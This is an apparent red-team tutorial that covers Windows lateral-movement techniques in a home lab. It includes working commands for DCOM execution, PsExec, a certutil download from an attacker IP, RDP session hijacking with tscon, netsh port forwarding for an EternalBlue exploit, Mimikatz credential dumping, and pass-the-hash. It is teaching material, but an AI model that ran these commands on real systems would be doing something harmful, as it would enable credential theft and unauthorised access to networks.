![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl2aBIevMjzW-zNdYE%2F-MRl2jREvqJTfXE8Uqe_%2Fimage.png?alt=media&token=70feb495-dc74-4444-a3bb-22479935d175)

**Usually Administrators can log in to a workstation where they have administrator privileges or sometimes we can find users that have this privileges as well.**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl2aBIevMjzW-zNdYE%2F-MRl2in4F-7Lumxs7dRZ%2Fimage.png?alt=media&token=4f7f0821-5959-4877-8a19-03328caa41d9)

Now will remote onto the target machine, assuming  we have credentials

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl2aBIevMjzW-zNdYE%2F-MRl2kNY9DbGun_fata0%2Fimage.png?alt=media&token=7913b228-3ca5-4e76-bac7-160fb8798137)

And Login successfully

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl2aBIevMjzW-zNdYE%2F-MRl2lHcACETfdaTLd2W%2Fimage.png?alt=media&token=647a4020-731b-4b70-9200-9f5f6b97d180)

### vnc

Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing(VNC). The adversary may then perform actions as the logged-on user.

VNC is a desktop sharing system that allows users to remotely control another computer's display by relaying mouse and keyboard inputs over the network. VNC does not necessarily use standard user credentials. Instead, a VNC client and server may be configured with sets of credentials that are only for VNC connections.

**Example**

We will encounter sometimes options where RDP is not available but we do have another form of GUI interface named VNC.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl2ZHEbwe5mAiWizzz%2F-MRl2ZgyJRbLEb5pfXG9%2Fimage.png?alt=media&token=c1ca7134-3888-41f6-864e-bfb279999bfd)

Above we require to have credentials (

**TIGHTVNC requires Remote Credentials only No username**

)

### distributed-component-object-model

Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model(DCOM). The adversary may then perform actions as the logged-on user.

The Windows Component Object Model(COM) is a component of the native Windows application programming interface(API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries(DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.

Permissions to interact with local and remote server COM objects are specified by access control lists(ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.

Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange(DDE) execution directly through a COM created instance of a Microsoft Office application bypassing the need for a malicious document.

**Example**

Component Object Model (COM) is a protocol used by processes with different applications and languages so they communicate with one another. COM objects cannot be used over a network, which introduced the Distributed COM (DCOM) protocol Matt Nelson discovered a lateral movement technique via DCOM, using the ExecuteShellCommand Method in the Microsoft Management Console (MMC) 2.0 scripting object model which is used for System Management Server administrative functions.

COM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). DCOM is transparent middle ware that extends the functionality of Component Object Model (COM) beyond a local computer using remote procedure call (RPC) technology.

So let's work on a quick technique, I will execute the calculator on the remote host using DCOM.The user will need Admin privileges on the Host machine to access the MMC 2.0 method and also Admin privileges on the Remote machine to execute.

**$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET IP"))**

**$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\Calc.exe",$null,$null,"7")**

**DCOM Demo**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1qsYe8_NuwS0Y6iV%2F-MRl1ylYgoOr-gJXZdX0%2FDCOM.gif?alt=media&token=d6f8b078-5041-4a1b-b17d-c97f4ff38f36)

### smb-windows-admin-shares

Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include, C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a network system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.

**Example**

Windows system have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$ , and IPC$.

Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over server message block (SMB) to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task, Service Execution, and Windows management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration patch levels.

The Net utility can be used to connect to Windows admin shares on remote systems using net use commands with valid credentials.

In this first example our Adversary has gain a shell on the Network, Enumerated and Dumped Credentials. But now he need's to move laterally on the network, to pivot between machines and find more info in the environment, in here comes a great Tools a Windows signed binary called PsExec.exe, It comes from the Microsoft Sysinternal Suite and allows user to execute PowerShell ( or cmd) on remote hosts on Port 445 (SMB) using named pipes. It first connects to the ADMIN$ share on the target over SMB, uploads PSEXESVC.EXE and uses Service Control Manager to start the .exe, which creates a named pipe on the remote system, and finally uses that pipe for I\O (Input and Output).

As we still want to be as stealthy as possible I used a Windows Tool to download the EXE.

certutil.exe -urlcache -split -f 

[http://IP/PsExec64.exe](http://192.168.56.10/PsExec64.exe)

http://IP/PsExec64.exe

 PsExec64.exe

First I will see where am I located.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1WYr-EH-LfvTc9oV%2Fimage.png?alt=media&token=b87d77ee-431e-4bdf-8ec2-2236aadd439f)

For the sake of this Demo I have all the creds, and Computer's I want to, and can access to.

Now let's use PsExec to get access to another machine, my current location is DESKTOP-CHARLIE and I will move to DESKTOP-DELTA.

Once PsExec is dropped onto the Target machine and gathered the necessary credentials we can move laterally onto a different host, with the following syntax we can call CMD to execute on the Remote Machine.

Currently I am located in Charlie:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1bNjHpaqRf1O6aAv%2Fimage.png?alt=media&token=79fdfbdb-28d0-40a4-8704-2736acf0acd5)

And my Target is the Delta Machine

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1_tveaW7v2YsSjPh%2Fimage.png?alt=media&token=7107605b-4a6e-4855-9634-d0374e293e40)

I will use the following syntax to catch a shell

PsExec64.exe 

\\192.168.1.240

[\\192.168.1.240](http://192.168.56.10/PsExec64.exe)

 -u David -p Password1 cmd

**Windows Admin Shares PSEXEC Demo**

Also we can use the net shareand net use commands this technique is not necessarily a shell gain on the machine, since we have the proper permissions for this share we can Mount it on our local machine and view file's just as if we were on the machine itself, but be wary this will not help in enumerating the "remote machine" as this only gives us read/write access onto a share and it's files we don't necessarily have a session on the remote machine, but with this in mind we can copy a binary on the shares mounted and use other techniques such as a Remote Task to execute this binary and gain a shell on the remote machine.

In the following I will mount a share on the Controlled machine and I will explore the share from a remote PC and here as from here can also READ/WRITE Files.

From CHARLIE Machine I will mount DELTA share and find a proof.txt file to demonstrate my technique on moving onto a different share, but as we can remember enumeration will not work as we still need to execute the binary on the remote machine and not from the shell session itself as we will still be the user that executes it.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1d-XVs7YUlW5OhO3%2Fimage.png?alt=media&token=1b8a6ff1-c932-4677-93cb-04f3ddda6bd0)

With net share we can see the available shares to discover and view.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1dtM9Gea8vhDUEG_%2Fimage.png?alt=media&token=fe4f3d0a-087a-43aa-a6f7-81e209a9fb9a)

We currently hold the credentials for the user's in DELTA so we will use David again to mount a share and start discovering more interesting file's on the Remote PC with ever executing code in the remote machine. You will be asked

for credentials just provided them and it will be good.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1fXt0clt09KuUEFC%2Fimage.png?alt=media&token=cb713a77-66cc-47b6-9519-4fb36a6e3c48)

Will check the Share.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1h6EJzqgUF43hwaq%2Fimage.png?alt=media&token=51c104ab-c4af-4ae4-a099-8c86eebba6ce)

Viewing the Folders in the remote share.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1i0X3wutTp4jYLBC%2Fimage.png?alt=media&token=5b58c1eb-9dd0-4ddd-ba47-6e5a68b03695)

And we can verify that we can Read Files and WRITE on the remote shares that is currently available.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1jLnWy_OsRuQscm8%2Fimage.png?alt=media&token=a2d93541-86b2-4183-a8c6-535512e69728)

Now what about catching a shell on the Remote system if we have this type of access? Well a known way is to copy a binary on the remote host and execute a remote task or the use of WMI both are valid here.

First let's Catch a shell from a Kali box and work from there.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1kKBilwKqV7A6W6n%2Fimage.png?alt=media&token=1c388e48-3a92-4ec2-ad43-e7d55c59b482)

I created a new binary that connects back to 1338 port, let's see that our share is currently connected.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1lEvhgQnNL3twUMT%2Fimage.png?alt=media&token=a9dbd3e5-1a1b-4027-9094-a37540a35025)

And copy it to a Folder that David can owns for now I will move this to the Desktop Folder. I downloaded a new binary

onto the folder I slightly changed the name and the port it connects back to is port 1338.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1m4gFaY3A_mEt7Xj%2Fimage.png?alt=media&token=09be5a11-ea24-45fc-a752-89d71aec7247)

Then from the command prompt we can copy the binary onto the Share and execute it, but how do we execute a remote binary so that we are currently on that machine instead of still being the current user? Well we can create a remote task or modify a remote service to catch the shell, we can also use WMI to execute a remote binary on a remote host.

Depending on where is your Binary located you would use copy BINARY_PATH TARGET_PATH

**When you mount a share make sure to remember the Letter of the Drive you used, you wont be able to copy if you use a UNC Path [**

When you mount a share make sure to remember the Letter of the Drive you used, you wont be able to copy if you use a UNC Path [

 

**\\DESKTOP-DELTA\**

\\DESKTOP-DELTA\

[\\DESKTOP-DELTA\](http://192.168.56.10/PsExec64.exe)

**]**

]

**WMIC Lateral Demo**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl1HED259oT9E7ny6N%2F-MRl1ojAN0LGkgq450xd%2FWMIC-Lateral.gif?alt=media&token=73748c0e-118a-4f86-a0af-d6cf719a06da)

**Remember, here the User and credential's for the remote host are known, you will probably find alternatives on how to achieve this**

Remember, here the User and credential's for the remote host are known, you will probably find alternatives on how to achieve this

.

### remote-desktop-protocol

Adversaries may use Valid Accounts to log into a computer using Remote Desktop Protocol(RDP). The adversary may then perform actions as the logged-on user.

Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services(RDS).

Adversaries may connect to a remote system over RDP/RDS to expand access with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features technique for Persistence.

**Example**

For Demo purposes I will already have credentials available for this Technique 

**(Do your proper enumeration to gain these)**

We can see in our Images below that we gain access through RDP and then continue to a different Machine as well through RDP

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl19S0UbZ4V3UzRepS%2F-MRl1FKUqZ7MdhIBTh3U%2Fimage.png?alt=media&token=b48d35f2-77bb-4af2-8c1d-057d4c4aea61)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl19S0UbZ4V3UzRepS%2F-MRl1GQUnmQVa2CIe_CB%2Fimage.png?alt=media&token=5753e429-314a-4b66-8b1e-fde0ae867bbd)

## t1563-remote-service-session-hijacking

Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may user valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.

Adversaries may commandeer these sessions to carry out actions on remote systems. Remote Service Session hijacking differs from use of Remote Services because it hijacks an existing session rather than creating a new session using Valid Accounts.

### rdp-hijacking

Adversaries may hijack a legitimate user's remote desktop session to move laterally within environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).

Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console. C:\Windows\System32\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user. This can be done remotely or locally and with active or disconnected session. It can also lead Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.

**Example**

It is possible to switch from one user's desktop to another through the use of 

**tscon**

, this will require us to have

NT AUTHORITY/SYSTEM

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl0J82KK6MJo5p0I-7%2F-MRl0SxQNxdJ0rVzKL9o%2Fimage.png?alt=media&token=714016a7-911f-4241-ac82-2161018a82c6)

Will first 

**query users**

  to check for any active sessions

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl0J82KK6MJo5p0I-7%2F-MRl0TZjhY8_wBjmSr6J%2Fimage.png?alt=media&token=99e3c39f-b8b9-4758-9a11-4d837266c727)

Then we use the tscon utility to switch sessions that are currently available

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl0J82KK6MJo5p0I-7%2F-MRl0UZXNAcvIeg_y0tW%2Fimage.png?alt=media&token=ba0d9be0-4ffb-406e-b069-748eb6eba9d1)

And we manage to access another session

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl0J82KK6MJo5p0I-7%2F-MRl0VVV0_7lNofAP5QO%2Fimage.png?alt=media&token=2650f1f6-bc7c-4b38-a94c-ab28205f39eb)

**RDP-Hijacking Demo:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl0oINFygilh8lDqpf%2F-MRl0uDQ_bxMCYd2i_8D%2FRDP%20Hijacking.gif?alt=media&token=1a235944-4eca-4217-8169-5dd7d4065fc0)

## t1570-lateral-tool-transfer

Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

**Example**

On this Demo will demonstrate how we can use tools to Lateral Move around the Network.

**CMD**

CMD can be used to copy tools to/from a remote share, this is true and very easy assuming we have the correct permissions to copy stuff onto the share.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl0-b-RaLacBVhjm3k%2F-MRl08mkM-Sx6fYTb8ga%2Fimage.png?alt=media&token=f73b3286-6f40-4ba0-b18f-4fa79dece9ef)

Above we see a small demo on how we can move our tools laterally using SMB Shares with the correct credentials and permissions, this can be used to replace files and wait for our victim to execute them and gain a shell on the Workstation.

Once the payload is executed we can capture the Shell and gain access to another workstation.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl0-b-RaLacBVhjm3k%2F-MRl09og5vdX3_yYflMF%2Fimage.png?alt=media&token=dad79c48-1e73-40a9-b9de-881db43dd0fe)

## t1534-internal-spearphishing

Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or system within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.

Adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic email login interfaces.

There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process. The Syrian Electronic Army(SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.

**Example**

**Well this is absolutely self-explanatory and to be honest I don't even know how to setup some internal testing Email Service**

## t1210-exploitation-of-remote-services

Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.

An adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.

There are several well-known vulnerabilities that exist in common services such as SMB and RDP as well as applications that may be used within internal networks such as MySQL and web server services.

Depending on the permissions level of vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement as well.

**Example**

For this demonstration I will use a very well-known vulnerability EternalBlue(MS17-010) in this Demo I will gain access to 1 machine and them proxy onto another PC in the internal Network

Initial Access:

Currently we hold an Initial Access (Phishing) now we need to enumerate the environment and search for other Workstations in the Domain

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzcJFbSBp-aKQdGUy%2Fimage.png?alt=media&token=06a9eacf-4937-4cd7-9bed-8ef0c579ca80)

We can use a command 

**GetDomainComputer**

  and find any workstations in the Domain and we find 3.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzbYeTO9sdrFZIBqP%2Fimage.png?alt=media&token=251dcf50-737d-45b6-8190-085280477740)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzfvZTJqt-aymsmIB%2Fimage.png?alt=media&token=3f3e221b-3baa-4a77-8502-6cebb26761d0)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzf4v1Oyg6ZoII2OH%2Fimage.png?alt=media&token=e1e502d7-9055-40ef-aaea-90e2fa567c82)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzgt-FTHIotyAa_bo%2Fimage.png?alt=media&token=98d97672-b20a-47fe-b5d2-6e45f2127ebc)

Now let's ping each of them to see which one is active. For Demo purposes we know it's Charlie.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzhocuQq1amWUSsy8%2Fimage.png?alt=media&token=57bbe6e3-2549-4b47-8da2-e3d061dd1c9c)

A port scan gives us valuable information that the SMB port is open and listening

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkziWx8Oza6tHaRU4p%2Fimage.png?alt=media&token=627b04fe-c6d9-48db-8951-cc172ae951d5)

Now let's create a PortForwarding Connection from the victim machine and have access from our attacking Box to attack the Service, we can use the built-innetsh to achieve this

**If there is a better way with other tools please do let me know as I am new to this myself LOL**

**##################################################**

**netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4000 connectaddress=10.0.2.18 connectport=445**

Once the Port forwarding is correct let us scan the machine and look for anything exploits.

** This scan should be a good output but I couldn’t get these results please see the ones below this to see what I saw please do let me know how to achieve this**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzla-Mgru2WVElOi2%2Fimage.png?alt=media&token=fb900f44-10e1-4b48-9397-d63a88f4e1a6)

Above we see the result of an nmap scan giving us information on the Workstation, we know at this point that the machine is vulnerable to EternalBlue. And various other scan show promising results

**Nmap**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzmX91jTb3WeGB_EK%2Fimage.png?alt=media&token=b47e8fcd-987b-4066-bfed-8e1915c096b9)

**Amap**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkznSWHE_mHzha5v4B%2Fimage.png?alt=media&token=bf408845-4c06-42fb-8f52-9a689fa182d5)

Now we exploit

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzqq7BXe0P0MnkJLn%2Fimage.png?alt=media&token=8d3f8e45-cbc1-4648-981d-a5d287cded49)

And move to a different machine now, we can upgrade our shell to continue with Covenant as well.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkzOecSyU6duYGpN_L%2F-MRkzq9CXjgS3B0iaC-J%2Fimage.png?alt=media&token=6f9e654f-b782-4784-8964-31f85e184935)

## t1550-use-alternate-authentication-material

Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.

​

Authentication processes generally require a valid identity (e.g. username) along with one ore more authentication factors (e.g., password, pin, physical smart card, token, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identitiy and the required authentication factors(s). Alternate authentication material may also by generated during the identity creation process.

Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication facor(s). Because the alternate authentication must be maintained by the system--either in memeory or in disk--it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system controls and authenticate to systems withoput knowing the plaintext password or any additional authentication facotrs.

### pass-the-ticket

In this Technique, valid Kerberos tickets for Valid Accounts are captured by Credential Dumping. A user's service ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows foe access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.

### pass-the-hash

Pass the hash (PtH) is a method of authenticating a user without having access to the user's clear-text password. This method bypasses standard authentication steps that require a clear text password, moving directly into the portion of the authentication that users the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access Technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.

Some great tools for demonstration are Mimikatz, CrackMapExec, Empire, PsExec, and WMI.

In this demonstration I will use Mimikatz to pass the hash I will give a small demo with CrackMapExec and PSExec, and I will link great references on these other techniques and frameworks. Since they also work fine but some are louder and we are trying to not go for that( at least).

For Mimikatz here we will combine a few tools to grab hashes we can simply use an Administrator Log and from there dump hashes but also we can use an Administrator login and then use PSEXEC to escalate from Admin to SYSTEM and then Dump hashes.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FZWWdUKWW73HlIt8C2TKq%2Fimage.png?alt=media&token=f062b259-10f3-4bcc-a54a-b69230764822)

**In this section of the Demo, I will dump hashes with Mimikatz and then use PsExec to Move Laterally.**

In the previous Image a used xfreerdp to connect to the target machine from here I proceeded to upload the tools necessary for PtH and lateral move, which will be mimikatz and PsExec.

I used the following syntax to dump hashes

mimikatz "privilege::debug::" "sekurlsa::logonpasswords" exit

 This will execute and exit since mimikatz start's its window and working from a shell is kinda buggy for now. So my option was to execute and exit.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FfhuQYu2s5rmiOewgHl6n%2Fimage.png?alt=media&token=152fafeb-5439-4851-aae9-478ec0d2f356)

Dumping hashes we see Ryan's NTLM Hash we can use this to authenticate as this user with plenty of tools. I'll continue with mimikatz and then move to others. Now here Ryan is an Administrator on DELTA. I will use PTT and then Log in to the Remote PC without ever using a clear-text password.

I will get an Access is denied error when I try to enumerate the 

c$

 Share.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FetDgkU2j1kZBukSteBon%2Fimage.png?alt=media&token=af9fbc6b-c395-46d1-b401-242f91a3c98b)

So how do we pass the hash with mimikatz. Well we continue with the following syntax "one-liner" will exit once executed:

mimikatz "privilege::debug" "sekurlsa::pth /user:Ryan /domain:WORKGROUP /ntlm:09238831b1af5edab93c773f56409d96" exit

And we can now list the directories on the remote machine.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fm8T4u3Mnm2zU0ROOu9FK%2FMimikatz-PTH.gif?alt=media&token=82807f9a-8b78-4688-b4fc-bfb3d53e68c8)

Great so an Example was made with Mimikatz to authenticate to a remote machine but let's demonstrate with other tools, In the next one I will use CrackMapExec amazing tool written in python and great for these situations for more info on 

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

. This amazing tool will be used to authenticate to SMB using the hash itself there are so many possibilities that can be done with this but I will focus on the Hash part only.

I will use Ryan's Hash to authenticate to the Machine using CrackMapExec.

crackmapexec smb 10.10.10.4 -u Ryan -H 09238831b1af5edab93c773f56409d96

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FHJ2Nqfhs2VkXLVSbU5WV%2Fimage.png?alt=media&token=4a6b90df-fd4c-44e6-91f0-5ba72a28226d)

You can also do it to the entire network.

